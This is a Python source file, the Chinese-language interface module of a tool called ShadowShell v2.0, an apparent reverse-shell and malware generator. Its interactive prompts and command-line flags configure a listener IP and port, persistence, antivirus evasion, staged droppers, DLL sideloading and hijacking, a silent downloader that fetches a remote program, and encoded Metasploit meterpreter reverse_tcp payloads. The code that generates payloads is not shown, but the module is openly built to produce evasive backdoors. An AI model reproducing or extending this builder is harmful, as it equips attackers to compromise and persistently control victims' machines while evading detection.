# -*- coding: utf-8 -*-
"""
用户界面模块
提供交互式界面和命令行参数处理
"""
import argparse
from .utils import validate_ip, validate_port, print_banner


def interactive_mode():
    """交互式模式"""
    print_banner()
    print("\n请输入以下信息:")
    
    # 获取IP地址
    while True:
        ip = input("监听IP地址 >>> ").strip()
        if validate_ip(ip):
            break
        print("❌ IP地址格式不正确，请重新输入")
    
    # 获取端口
    while True:
        port = input("监听端口 >>> ").strip()
        if validate_port(port):
            port = int(port)
            break
        print("❌ 端口号不正确，请输入 1-65535 之间的数字")
    
    # 高级选项
    print("\n🔧 高级选项:")
    retry_count = input("连接重试次数 (默认: 10) >>> ").strip() or "10"
    retry_delay = input("重试间隔秒数 (默认: 5) >>> ").strip() or "5"
    key_length = input("密钥长度 (默认: 16) >>> ").strip() or "16"
    
    try:
        retry_count = int(retry_count)
        retry_delay = int(retry_delay)
        key_length = int(key_length)
    except ValueError:
        print("⚠️ 使用默认值")
        retry_count, retry_delay, key_length = 10, 5, 16
    
    # 输出选项
    output_dir = input("输出目录 (默认: output) >>> ").strip() or "output"
    custom_filename = input("自定义文件名 (可选) >>> ").strip() or None
    
    add_persistence = input("添加持久化功能? (y/N) >>> ").strip().lower() == 'y'
    anti_detection = input("添加反杀毒特征? (Y/n) >>> ").strip().lower() != 'n'
    use_dropper = input("使用分阶段执行模式? (Y/n) >>> ").strip().lower() != 'n'
    
    # 白加黑功能选项
    use_white_black = input("使用白加黑技术? (y/N) >>> ").strip().lower() == 'y'
    white_black_mode = None
    
    if use_white_black:
        print("\n🎭 白加黑模式选择:")
        print("1. 合法程序包装 (推荐)")
        print("2. DLL侧加载")
        print("3. DLL劫持")
        
        while True:
            choice = input("请选择模式 (1-3) >>> ").strip()
            if choice in ['1', '2', '3']:
                white_black_mode = {
                    '1': 'wrapper',
                    '2': 'sideloading', 
                    '3': 'hijacking'
                }[choice]
                break
            print("❌ 请输入有效选项 (1-3)")
    
    # 新增：下载器选项
    use_downloader = input("生成下载器模式? (y/N) >>> ").strip().lower() == 'y'
    download_url = None
    downloader_silent = False
    
    if use_downloader:
        while True:
            download_url = input("下载地址 (主程序URL) >>> ").strip()
            if download_url and (download_url.startswith('http://') or download_url.startswith('https://')):
                break
            print("❌ 请输入有效的HTTP/HTTPS URL")
        
        downloader_silent = input("下载器静默模式? (Y/n) >>> ").strip().lower() != 'n'
    
    # 新增：MSF集成选项
    use_msf = input("使用MSF(Metasploit)载荷? (y/N) >>> ").strip().lower() == 'y'
    msf_payload = None
    msf_encoder = None
    msf_iterations = 1
    msf_format = 'python'
    
    if use_msf:
        # 检查MSF可用性
        from .msf_integration import MSFIntegration
        msf = MSFIntegration()
        
        if not msf.is_available():
            print("⚠️ 警告: 未检测到MSF/msfvenom，将跳过MSF集成")
            use_msf = False
        else:
            print("\n🎯 MSF载荷配置:")
            print("推荐载荷类型:")
            recommended = [
                "1. python/meterpreter/reverse_tcp (推荐)",
                "2. python/meterpreter/reverse_https", 
                "3. windows/meterpreter/reverse_tcp",
                "4. linux/x64/meterpreter/reverse_tcp"
            ]
            for rec in recommended:
                print(f"   {rec}")
            
            # 载荷选择
            msf_payload = input("MSF载荷类型 (默认: python/meterpreter/reverse_tcp) >>> ").strip()
            if not msf_payload:
                msf_payload = "python/meterpreter/reverse_tcp"
            
            # 编码器选择 
            use_encoder = input("使用编码器? (Y/n) >>> ").strip().lower() != 'n'
            if use_encoder:
                print("推荐编码器: x86/shikata_ga_nai, base64, x64/zutto_dekiru")
                msf_encoder = input("编码器 (默认: x86/shikata_ga_nai) >>> ").strip()
                if not msf_encoder:
                    msf_encoder = "x86/shikata_ga_nai"
                
                iterations_input = input("编码迭代次数 (默认: 3) >>> ").strip()
                try:
                    msf_iterations = int(iterations_input) if iterations_input else 3
                except ValueError:
                    msf_iterations = 3
            
            # 输出格式
            print("输出格式: python (推荐), raw, exe, dll, powershell")
            msf_format = input("MSF输出格式 (默认: python) >>> ").strip() or 'python'
    
    return {
        'ip': ip,
        'port': port,
        'retry': retry_count,
        'delay': retry_delay,
        'key_length': key_length,
        'output_dir': output_dir,
        'filename': custom_filename,
        'persistence': add_persistence,
        'anti_detection': anti_detection,
        'use_dropper': use_dropper,
        'use_white_black': use_white_black,
        'white_black_mode': white_black_mode,
        'use_downloader': use_downloader,
        'download_url': download_url,
        'downloader_silent': downloader_silent,
        'use_msf': use_msf,
        'msf_payload': msf_payload,
        'msf_encoder': msf_encoder,
        'msf_iterations': msf_iterations,
        'msf_format': msf_format
    }


def command_line_mode():
    """命令行参数模式"""
    parser = argparse.ArgumentParser(description='ShadowShell v2.0 - 高级模块化Shell生成器')
    parser.add_argument('-i', '--ip', required=True, help='监听IP地址')
    parser.add_argument('-p', '--port', required=True, type=int, help='监听端口')
    parser.add_argument('-r', '--retry', default=10, type=int, help='连接重试次数')
    parser.add_argument('-d', '--delay', default=5, type=int, help='重试间隔')
    parser.add_argument('-k', '--key-length', default=16, type=int, help='密钥长度')
    parser.add_argument('-o', '--output', default='output', help='输出目录')
    parser.add_argument('-f', '--filename', help='自定义文件名')
    parser.add_argument('--persistence', action='store_true', help='添加持久化功能')
    parser.add_argument('--anti-detection', action='store_true', help='添加反杀毒特征')
    parser.add_argument('--use-dropper', action='store_true', help='使用分阶段执行模式')
    parser.add_argument('--use-white-black', action='store_true', help='使用白加黑技术')
    parser.add_argument('--white-black-mode', choices=['wrapper', 'sideloading', 'hijacking'], 
                       default='wrapper', help='白加黑模式: wrapper(包装), sideloading(侧加载), hijacking(劫持)')
    parser.add_argument('--use-downloader', action='store_true', help='生成下载器模式')
    parser.add_argument('--download-url', help='下载地址 (主程序URL)')
    parser.add_argument('--downloader-silent', action='store_true', help='下载器静默模式')
    parser.add_argument('--use-msf', action='store_true', help='使用MSF(Metasploit)载荷')
    parser.add_argument('--msf-payload', default='python/meterpreter/reverse_tcp', 
                       help='MSF载荷类型 (默认: python/meterpreter/reverse_tcp)')
    parser.add_argument('--msf-encoder', help='MSF编码器 (如: x86/shikata_ga_nai)')
    parser.add_argument('--msf-iterations', type=int, default=3, help='MSF编码迭代次数')
    parser.add_argument('--msf-format', default='python', choices=['python', 'raw', 'exe', 'dll', 'powershell'],
                       help='MSF输出格式')
    parser.add_argument('--quiet', action='store_true', help='静默模式')
    parser.add_argument('--silent-delay', default=30, type=int, help='静默延迟时间（秒），在执行危险操作前等待')
    
    return parser.parse_args()
